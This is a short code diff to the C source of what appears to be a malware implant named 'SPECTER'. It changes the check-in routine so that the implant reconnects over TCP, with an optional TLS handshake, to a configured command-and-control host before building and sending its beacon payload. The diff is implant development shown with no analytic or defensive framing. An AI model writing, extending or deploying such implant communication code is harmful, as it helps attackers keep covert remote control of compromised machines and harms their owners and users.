@@ -1068,6 +1068,27 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
     IMPLANT_CONFIG *cfg = cfg_get(ctx);
     if (!cfg) return STATUS_UNSUCCESSFUL;
 
+    CHANNEL_CONFIG *ch = &cfg->channels[comms->active_channel];
+
+    /* Reconnect TCP for each checkin (HTTP/1.0 — server closes after response) */
+    if (comms->state >= COMMS_STATE_TLS_CONNECTED)
+        comms_tls_close(comms);
+    else if (comms->state >= COMMS_STATE_TCP_CONNECTED)
+        comms_tcp_close(comms);
+
+    COMMS_TRACE("[SPECTER] checkin: tcp_connect...");
+    NTSTATUS status = comms_tcp_connect(comms, ch->url, ch->port);
+    if (!NT_SUCCESS(status)) return status;
+
+    if (ch->needs_tls && comms->api.tls_available) {
+        status = comms_tls_handshake(comms, ch->url);
+        if (!NT_SUCCESS(status)) {
+            comms_tcp_close(comms);
+            return status;
+        }
+    }
+    COMMS_TRACE("[SPECTER] checkin: connected");
+
     /* Build plaintext TLV payload */
     COMMS_TRACE("[SPECTER] checkin: build_payload...");
     BYTE payload[512];
@@ -1075,8 +1096,6 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
     if (payload_len == 0) return STATUS_UNSUCCESSFUL;
     COMMS_TRACE("[SPECTER] checkin: payload built OK");
 
-    NTSTATUS status;
-    CHANNEL_CONFIG *ch = &cfg->channels[comms->active_channel];
     BYTE http_buf[8192];
     DWORD http_len = 0;
 
